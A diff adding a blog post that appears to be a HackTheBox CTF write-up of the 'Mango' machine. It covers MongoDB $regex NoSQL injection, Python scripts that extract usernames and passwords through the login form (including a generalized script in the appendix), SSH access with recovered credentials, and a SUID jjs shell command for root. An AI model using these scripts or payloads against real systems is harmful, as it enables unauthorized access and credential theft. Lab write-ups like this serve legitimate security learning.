@@ -1,0 +1,414 @@
+---
+layout: htb_box
+title: "HTB: Mango"
+code: htb_mango
+long_date: "23rd February 2020"
+author: rubytox
+---
+<p>Hello everyone!</p>
+
+<p>Today, I'm publishing a writeup for <a href="https://www.hackthebox.eu">HackTheBox</a>'s machine Mango, made by
+    <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a>. This machine was harder for me than the previous ones, thus it allowed me to learn a lot
+    of new interesting concepts.<!--more--></p>
+
+<p>Let's start! First, as usual, I'll put Mango's IP address in my <code>/etc/hosts</code> file, so that this box will
+    be called <code>mango.htb</code>. We'll start by a basic <code>nmap</code> scan, which gives us the following
+    result:</p>
+<pre class="prettyprint nocode">
+# Nmap 7.60 scan initiated Sun Jan 19 18:04:44 2020 as: nmap -sC -sV -oA nmap/mango mango.htb
+Nmap scan report for mango.htb (10.10.10.162)
+Host is up (0.61s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (EdDSA)
+80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 19 18:06:23 2020 -- 1 IP address (1 host up) scanned in 99.47 seconds
+</pre>
+
+<p>So it seems we have two websites, the first one hosted on port 80 displays a <code>403 Forbidden</code> error page; the other
+    one is on port 443. Let's go to the second one, we enter in our browser the URL <code>https://mango.htb</code>:</p>
+
+<img src="/img/{{ page.code }}/mango1.png" alt="Mango search engine" />
+
+<p>This is a webpage looking like Google's homepage, and the only link that is working redirects to an analytics webpage.
+    However, turns out this page was a rabbit hole, because we can't do anything from it.</p>
+
+<p>One piece of detail that needed to be noticed right away was the SSL certificate: some information are given directly
+    in the <code>nmap</code> scan, but it's possible to find that by reading the certificate in our browser as well. Here
+    is the certificate:</p>
+
+<figure>
+    <img src="/img/{{ page.code }}/mango2.png" alt="Mango's certificate" />
+    <figcaption>The picture is in french, but the only interesting information is the certificate's issuer</figcaption>
+</figure>
+
+<p>As seen in the picture, the certificate was issued by the domain <code>staging-order.mango.htb</code>. It might be worth
+    checking this domain out. We enter this URL in our browser, and we land on the following webpage:</p>
+
+<img src="/img/{{ page.code }}/mango3.png" alt="Staging order login page" />
+
+<p>Here I was stuck for a rather long time, it was a bit hard to be able to login. The box's name gives us a big hint:
+    Mango stands here for MongoDB, a DBMS based part of the NoSQL DBMS family. I assumed there was a user named <code>admin</code>,
+    and I decided to write a script in order to find their credentials. This is made possible by a vulnerability
+    in MongoDB: instead of passing the password field for instance, we're actually able to pass the application
+    a regular expression. Let's take an example: if I want to connect to the login form using username <code>admin</code>
+    and password <code>abcdef</code>, I would use a <code>POST</code> request containg the following information (JSON
+    formatted):
+    </p>
+<pre class="prettyprint">
+{
+    "username": "admin",
+    "password": "abcdef"
+}
+</pre>
+
+<p>What we're exploiting here is the fact that instead of passing a member named <code>password</code>, I can pass to the
+    form a member called <code>password[$regex]</code>, and the server will understand it as if it were the form's field
+    <code>password</code>, but as a regular expression. This means that if <code>admin</code>'s password is actually
+    <code>abcdef</code>, then passing the application the following data should allow me to be connected:</p>
+<pre class="prettyprint">
+{
+    "username": "admin",
+    "password[$regex]": "abc.{1}ef"
+}
+</pre>
+
+<p><strong>Note:</strong> this regular expression matches a string containing <code>abc</code>, followed by any
+    character one time, then <code>ef</code>.</p>
+
+
+<p>When we observe the requests and responses using BurpSuite, we find out that when passing
+    a regex matching the user's correct password, the application responds with a 302 instead of 200.</p>
+
+<figure>
+    <img src="/img/{{ page.code }}/mango5.png" alt="Request using valid regex" />
+    <figcaption>Here we pass the regex <code>.{1}</code> which is always valid because the password
+                contains at least one character.</figcaption>
+</figure>
+<figure>
+    <img src="/img/{{ page.code }}/mango6.png" alt="Response to a valid regex" />
+    <figcaption>The server responds with status code 302.</figcaption>
+</figure>
+
+<figure>
+    <img src="/img/{{ page.code }}/mango7.png" alt="Request using invalid regex" />
+    <figcaption>Here we pass the regex <code>.{2151513456}</code> which is unlikely to be true.</figcaption>
+</figure>
+<figure>
+    <img src="/img/{{ page.code }}/mango8.png" alt="Response to an invalid regex" />
+    <figcaption>The server responds with status code 200.</figcaption>
+</figure>
+
+
+<p>This allows us to write the following script in order to guess user <code>admin</code>'s password length:</p>
+<pre class="prettyprint linenums">
+#!/usr/bin/env python3
+import requests
+from colors import *
+
+url = "http://staging-order.mango.htb/index.php"
+
+req = requests.Session()
+
+creds = {
+    'username': 'admin',
+    'password[$regex]': '.{0}'
+}
+
+response = req.post(url, creds, allow_redirects=False)
+
+i = 1
+while response.status_code == 302:
+    creds['password[$regex]'] = ".{" + str(i) + "}"
+    response = req.post(url, creds, allow_redirects=False)
+    print("[*] [{}] Status code: {}".format(i, response))
+    if response.status_code == 302:
+        print("[~] Password can be at least " + str(i) + " characters long.")
+        i += 1
+    else:
+        print("[~] Encountered 200 status code.")
+
+print("[+] Password is " + str(i-1) + " characters long.")
+</pre>
+
+<p>This script is easy to understand: first, it tests whether the password contains the null string, which isn't really
+    useful but it's the start of a recursive pattern. Then, while the server responds with a 302 status code, we test whether
+    the password contains one more character. If the server responds with 200 status code to a given <code>i</code> value,
+    then it means that the password does not contain a string which is <code>i</code> character long; however assuming the
+    server responded with 302 status code for <code>i-1</code>, then the password should be <code>i-1</code> characters
+    long.</p>
+
+<p>Running this script, we learn that user <code>admin</code>'s password is 12 characters long. Now, using a similar
+    approach, we're going to guess the actual password: we are going to test character by character, which character returns
+    a 302 status code and not a 200 status code. In the following script, we make the test from the end of the password.
+    For instance, if <code>admin</code>'s password is <code>abcdef</code>, then we're going to pass the following
+    regular expressions to the form:</p>
+<ul>
+    <li><code>a$</code> : 200 status code;</li>
+    <li><code>b$</code> : 200 status code;</li>
+    <li><code>c$</code> : 200 status code;</li>
+    <li><code>d$</code> : 200 status code;</li>
+    <li><code>e$</code> : 200 status code;</li>
+    <li><code>f$</code> : 302 status code.</li>
+</ul>
+
+<p>Then, as we know the password's length, we do the same process again until we have found all the characters. The
+    script looks like:</p>
+<pre class="prettyprint linenums">
+#!/usr/bin/env python3
+import requests
+import urllib3
+import string
+from colors import Colors
+urllib3.disable_warnings()
+
+password = ""
+url = "http://staging-order.mango.htb/index.php"
+
+creds = {
+    "username": "admin",
+    "password[$regex]": ""
+}
+
+remaining = 12 - len(password)
+
+while remaining > 0:
+    for c in string.printable:
+        if c not in ['*', '+', '.', '?', '|']:
+            Colors.info("Testing end: " + str(c + password))
+            Colors.note("{} characters remaining.".format(remaining))
+            creds['password[$regex]'] = "{}$".format(c + password)
+            r = requests.post(url, data=creds, verify=False, allow_redirects=False)
+            if r.status_code == 302:
+                password = c + password
+                Colors.success("This password's end worked: {}".format(password))
+                remaining -= 1
+                break
+</pre>
+
+<p><strong>Note:</strong> in the script, we do not consider the characters <code>*</code>, <code>+</code>,
+    <code>.</code>, <code>?</code> and <code>|</code> as they are special characters used by regular expressions. We
+    were lucky and the user didn't use those characters in their password. However, if he had, we would have to escape
+    those characters.</p>
+
+<p>This script allows us to get the following password for user <code>admin</code>: <strong>t9KcS3>!0B#2.</strong> Using
+    those credentials with the form makes us go to another page, which isn't actually interesting:</p>
+<img src="/img/{{ page.code }}/mango4.png" alt="home.php page" />
+
+<p>I was stuck for a bit, then I figured out there might be other users than <code>admin</code>: actually this user was
+    found by a lucky guess. I decided to change a little the previous script in order to enumerate users using the
+    exact same approach as before: I put in the password field the regular expression <code>.{0}</code> which is always
+    true, and I used the same script as before to find a username. This script isn't very efficient because it used an
+    infinite loop: I stop manually the script when I find a username that I think might work. In addition, in order not
+    to find the same username twice, I iterate over <code>string.printable</code> in natural order, then in reverse order.
+    This approach is very limited and allows us to guess only two usernames, but here it is enough:</p>
+<pre class="prettyprint linenums">
+import requests
+import urllib3
+import string
+import urllib
+from colors import Colors
+urllib3.disable_warnings()
+
+u="http://staging-order.mango.htb/index.php"
+
+creds = {
+    "username[$regex]": "",
+    "password[$regex]": ".{0}"
+}
+
+while True:
+    for c in reversed(string.printable):
+        if c not in ['*','+','.','?','|','^','$']:
+            Colors.info("Testing end: " + str(c + password))
+            creds['username[$regex]'] = "{}$".format(c + password)
+            r = requests.post(u, data = creds,verify = False, allow_redirects = False)
+            if r.status_code == 302:
+                password = c + password
+                Colors.success("This user's end worked: {}".format(password))
+                break
+</pre>
+
+<p>Iterating over <code>string.printable</code> using the natural order, we find the username <code>admin</code>; in reverse
+    order, we find a username <code>mango</code>. Using the password-guessing script from before, we easily find this user's
+    password: <strong>h3mXK8RhU~f{]f5H</strong>.</p>
+
+<p>When we login using the form, we land on the same page as before. However, with a lucky guess, we might think that user
+    <code>mango</code> is a real user on the machine: let's try to log in over SSH with those credentials.</p>
+<pre class="prettyprint nocode">
+$ ssh mango@mango.htb
+mango@mango.htb's password: <span style="color: #6D071A; font-weight: bold;">h3mXK8RhU~f{]f5H</span>
+mango@mango:~$ ls -la
+total 32
+drwxr-xr-x 5 mango mango 4096 Feb 27 17:40 .
+drwxr-xr-x 4 root  root  4096 Sep 27 14:02 ..
+lrwxrwxrwx 1 mango mango    9 Sep 27 14:31 .bash_history -> /dev/null
+-rw-r--r-- 1 mango mango  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mango mango 3771 Apr  4  2018 .bashrc
+drwx------ 2 mango mango 4096 Sep 28 15:27 .cache
+drwx------ 3 mango mango 4096 Sep 28 15:27 .gnupg
+-rw-r--r-- 1 mango mango  807 Apr  4  2018 .profile
+drwxrwxr-x 3 mango mango 4096 Feb 27 17:40 .terminfo
+</pre>
+
+<p>It worked! But there is no <code>user.txt</code> here... Let's take a look at the <code>/home</code> directory:</p>
+<pre class="prettyprint nocode">
+mango@mango:~$ ls /home
+admin mango
+</pre>
+
+<p>Guess we have to gain access to <code>admin</code>'s home directory after all. We're going to try using the password
+    we guessed earlier:</p>
+<pre class="prettyprint nocode">
+mango@mango:~$ su admin
+Password: <span style="color: #6D071A; font-weight: bold;">t9KcS3>!0B#2</span>
+$ id
+uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
+$ cat /home/admin/user.txt
+79bf3[-- REDACTED --]47e92
+</pre>
+
+<p>It works, and now we owned user! Now, let's move on to owning root.</p>
+
+<p>To do so, we're going to learn about a very useful script: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a>.
+    It is a script that enumerates a lot of interesting things in an operating system we wish to privilege escalate in.
+    Running this script in Mango, we notice the following interesting part:</p>
+<pre class="prettyprint nocode">
+[+] SUID
+[.. Many lines ..]
+/usr/lib/jvm/java-11-openjdk-amd64/bin<span style="background-color: yellow; color: red;">/jjs</span>
+[.. Many lines ..]
+</pre>
+
+<p>The red text on yellow background color code means that linpeas found something that is really worth
+    checking out. In fact, we learn in this section that the program <code>jjs</code> has the SUID flag set, which means
+    it should be possible to execute it with root privilege. Let's take a look at <code>jjs</code>'
+    <a href="https://gtfobins.github.io/gtfobins/jjs/">GTFObins</a>' page: we are given the following command that should
+    spawn a shell:</p>
+<pre class="prettyprint nocode">
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
+</pre>
+
+<p>Basically, we are using Java in order to run <code>sh</code> and redirecting stdin, stdout and stderr accordingly. This
+    code is then piped to <code>jjs</code> which runs it. However, using this very command doesn't work on our system, for
+    a reason I couldn't really understand, thus I modified it in order to make it just print the flag. Basically, if you can
+    do that, then you could run any command as root, so it is a valid root own:</p>
+<pre class="prettyprint nocode">
+$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo cat /root/root.txt >$(tty) 2>$(tty)').waitFor()" | jjsWarning: The jjs tool is planned to be removed from a future JDK release
+jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo cat /root/root.txt >/dev/pts/5 2>/dev/pts/5').waitFor()
+8a8ef[-- REDACTED --]9ab15
+0
+jjs> $
+</pre>
+
+<p><strong>Note:</strong> <code>jjs</code> can be run as root only from user <code>admin</code>.</p>
+
+<p>So we finally owned root! This box was really fun, and way harder for me than the boxed I owned before. It was a really
+    interesting experience, and I think it's the first time I actually have to make my own scripts from zero to own
+    the box.</p>
+<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
+
+<h3>Appendix</h3>
+
+<p>Here you can find a complete script that guesses the password length for a given username passed through command line,
+    then tries to guess the password. This script should work for any login form that has the same vulnerability:</p>
+<pre class="prettyprint linenums">
+#!/usr/bin/env python3
+import requests
+import sys
+import string
+from colors import *
+
+
+def password_length(username, url):
+    req = requests.Session()
+    creds = {
+        'username': username,
+        'password[$regex]': '.{0}'
+    }
+
+    response = req.post(url, creds, allow_redirects=False)
+
+    i = 1
+    while response.status_code == 302:
+        creds['password[$regex]'] = ".{" + str(i) + "}"
+        response = req.post(url, creds, allow_redirects=False)
+        if response.status_code == 302:
+            Colors.info("Password can be at least " + str(i) + " characters long.", end='')
+            print("\r", end='')
+            i += 1
+        else:
+            print()
+            Colors.info("Encountered 200 status code.")
+
+    Colors.success("Password is " + str(i-1) + " characters long.")
+    return i-1
+
+
+def guess_password(username, url):
+    remaining = password_length(username, url)
+    password = ""
+    creds = {
+        'username': username,
+        'password[$regex]': '.{0}'
+    }
+
+    while remaining > 0:
+        for c in string.printable:
+            if c not in ['*', '+', '.', '?', '|']:
+                output = "Remaining {} characters | Testing end: {}"
+                Colors.info(output.format(remaining, c), end='')
+                print(Colors.BGREEN + password + Colors.NONE, end='')
+                print('\r', end='')
+                creds['password[$regex]'] = "{}$".format(c + password)
+                r = requests.post(url, data=creds, verify=False, allow_redirects=False)
+                if r.status_code == 302:
+                    password = c + password
+                    remaining -= 1
+                    break
+    print()
+    return password
+
+
+def main():
+    username = sys.argv[1]
+    url = sys.argv[2]
+
+    password = guess_password(username, url)
+    Colors.success("Found password: {}".format(password))
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        usage = """Usage: {} username url
+\t- username : \tthe username of the user whose password we want to guess
+\t- url : \tthe url to the vulnerable login form """.format(sys.argv[0])
+        Colors.fail(usage)
+        exit(1)
+    main()
+</pre>
+
+<p>Assuming the script is called <code>bruteforce.py</code>, you would run it against Mango box's user <code>admin</code>
+    the following way:</p>
+<pre class="prettyprint nocode">
+./bruteforce.py admin "http://staging-order.mango.htb/index.php"
+</pre>
+
+<p><strong>Note:</strong> In my scripts I use a lot of functions from the <code>Colors</code> class. I discuss about
+    that in the following article: <a href="{% post_url /articles/2020-02-27-Python_colors %}">Python Colors package</a>.</p>
